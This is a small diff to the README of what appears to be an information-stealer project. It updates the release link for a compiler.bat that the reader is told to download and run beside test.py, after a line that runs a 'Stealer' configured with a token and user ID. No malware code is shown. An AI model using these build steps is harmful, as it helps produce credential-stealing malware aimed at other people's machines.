@@ -144,7 +144,7 @@ Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
 
 #### With BAT
-1. Download [compiler](https://github.com/FallenAstaroth/stink/releases/download/v1.2.2/compiler.bat).
+1. Download [compiler](https://github.com/FallenAstaroth/stink/releases/download/v1.3.0/compiler.bat).
 2. Move it to the same directory as the test.py file.
 3. Run compiler.bat.
 
